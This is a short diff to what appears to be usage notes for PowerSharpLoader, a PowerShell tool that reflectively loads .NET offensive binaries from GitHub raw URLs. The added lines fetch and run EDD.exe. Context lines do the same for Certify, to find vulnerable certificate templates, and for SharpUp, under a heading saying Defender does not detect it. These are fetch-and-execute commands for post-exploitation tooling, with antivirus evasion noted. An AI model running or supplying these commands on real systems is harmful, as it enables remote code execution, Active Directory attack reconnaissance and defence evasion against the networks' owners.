@@ -29,6 +29,10 @@ Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blo
 ## Load Certify
 Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Certify.exe?raw=true -Command "find /vulnerable"
 
+## Load EDD
+Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/EDD.exe?raw=true -Command "-h"
+Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/EDD_any.exe?raw=true -Command "-h"
+
 
 ### After fix the reflectedType is not public issue (Defender not detected):
 ## Load SharpUp
